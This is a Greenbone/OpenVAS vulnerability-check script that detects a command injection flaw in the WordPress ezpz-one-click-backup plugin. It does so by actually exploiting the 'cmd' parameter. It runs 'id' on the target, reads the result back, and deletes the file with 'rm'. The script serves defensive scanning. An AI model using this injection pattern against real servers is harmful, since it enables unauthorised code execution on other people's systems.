CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105029" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_name( "WordPress Plugin 'ezpz-one-click-backup' 'cmd' Parameter OS Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.openwall.com/lists/oss-security/2014/05/01/11" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2014-05-21 11:38:56 +0200 (Wed, 21 May 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "impact", value: "An attacker can exploit this issue to execute arbitrary code
  within the context of the web server." );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response." );
	script_tag( name: "insight", value: "Input passed via the 'cmd' parameter in ezpz-archive-cmd.php
  is not properly sanitized." );
	script_tag( name: "solution", value: "Remove this plugin from your WordPress installation." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "summary", value: "The ezpz-one-click-backup plugin for WordPress is prone to remote code
  execution vulnerability because it fails to properly validate user supplied input." );
	script_tag( name: "affected", value: "12.03.10 and some earlier versions." );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + ".txt";
vuln_url = dir + "/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php?cmd=";
url = vuln_url + "id>../backups/" + file;
req = http_get( item: url, port: port );
buf = http_send_recv( port: port, data: req );
if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
	exit( 99 );
}
url = dir + "/wp-content/plugins/ezpz-one-click-backup/backups/" + file;
req = http_get( item: url, port: port );
buf = http_send_recv( port: port, data: req );
if(IsMatchRegexp( buf, "uid=[0-9]+.*gid=[0-9]+" )){
	url = vuln_url + "rm%20../backups/" + file;
	req = http_get( item: url, port: port );
	http_send_recv( port: port, data: req, bodyonly: FALSE );
	report = http_report_vuln_url( port: port, url: vuln_url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

